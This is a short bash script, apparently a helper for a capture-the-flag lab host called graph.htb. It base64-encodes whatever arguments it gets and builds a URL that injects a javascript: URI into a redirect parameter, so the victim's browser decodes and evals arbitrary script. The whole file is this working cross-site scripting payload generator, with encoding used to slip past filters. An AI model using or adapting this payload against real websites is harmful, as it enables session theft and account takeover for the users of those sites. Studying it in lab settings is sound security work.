#!/bin/bash

PAYLOAD=$(echo -n "$@" | base64 -w 0)
echo 'http://graph.htb/?redirect=javascript:eval(atob("'"${PAYLOAD}"'"));'
